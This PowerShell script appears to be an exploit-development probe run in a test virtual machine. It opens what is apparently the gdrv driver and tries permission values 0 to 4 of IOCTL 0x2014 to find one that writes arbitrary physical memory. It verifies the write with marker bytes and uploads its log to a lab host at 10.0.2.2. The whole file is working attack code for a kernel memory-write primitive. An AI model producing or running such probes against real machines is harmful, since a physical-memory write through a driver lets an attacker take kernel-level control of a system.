# probeF.ps1 - write-path variant: which 0x2014 perm (0..4) actually writes physical memory?
$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::Expect100Continue = $false
$base = 'http://10.0.2.2:8080'
$d = $PSScriptRoot
$log = New-Object System.Collections.ArrayList
function L([string]$s) { $log.Add($s) | Out-Null }
try { Add-Type -Path (Join-Path $d 'p37_prov.cs') } catch { L ('COMPILE FAIL ' + $_.Exception.Message); $log -join "`r`n" | Set-Content "$d\probeF.out"; exit 1 }
$g = [IntPtr]::Zero
$e = [P37Prov]::GdrvOpen([ref]$g)
L ('open=' + $e)
if ($e -ne '') { $log -join "`r`n" | Set-Content "$d\probeF.out"; exit 1 }

$target = [uint64]0x1F000000
$pg = [P37Prov]::PageAlloc([uint64]0x14000000)
$src = [P37Prov]::PageAlloc([uint64]0x15000000)
L ('pg=0x{0:x} src=0x{1:x} target=0x{2:x}' -f $pg.ToInt64(), $src.ToInt64(), $target)
try { $before = [P37Prov]::GdrvReadOneRaw($g, $target, 0x1000); L ('before nz={0} head={1}' -f (($before | Where-Object { $_ -ne 0 }).Count), [P37Prov]::Hex($before[0..7])) }
catch { L ('before ERR ' + $_.Exception.Message) }

$win = -1
for ($perm = 0; $perm -le 4; $perm++) {
    [P37Prov]::MemFill($src, 0x1000, [byte](0x40 + $perm))
    $gt = [uint32]0; $er = [uint32]0
    $res = ''
    try { $res = [P37Prov]::IoPerm($g, $perm, $target, [uint64]$pg.ToInt64(), $src, 0x1000, [ref]$gt, [ref]$er) }
    catch { $res = 'EXC ' + $_.Exception.Message }
    $mk = [byte](0x40 + $perm)
    $hit = 0
    try { $back = [P37Prov]::GdrvReadOneRaw($g, $target, 0x1000); for ($i = 0; $i -lt 64; $i++) { if ($back[$i] -eq $mk) { $hit++ } } } catch { }
    L ('perm {0}: got={1} err={2} resv={3} marker_hits_in_64={4}' -f $perm, $gt, $er, $res, $hit)
    if ($hit -gt 32 -and $win -lt 0) { $win = $perm }
}
L ('WINNER=' + $win)
if ($win -ge 0) { L 'VERDICT: 0x2014 write path WORKS in guest with perm ' + $win } else { L 'VERDICT: no 0x2014 perm wrote' }
$body = $log -join "`r`n"
Set-Content -LiteralPath "$d\probeF.out" -Value $body
$tag = 'x'
try { $tag = (New-Object Net.WebClient).DownloadString("$base/active.txt").Trim() } catch { }
try { (New-Object Net.WebClient).UploadString("$base/log?vm=$tag", ("## probeF`r`n" + $body)) } catch { }
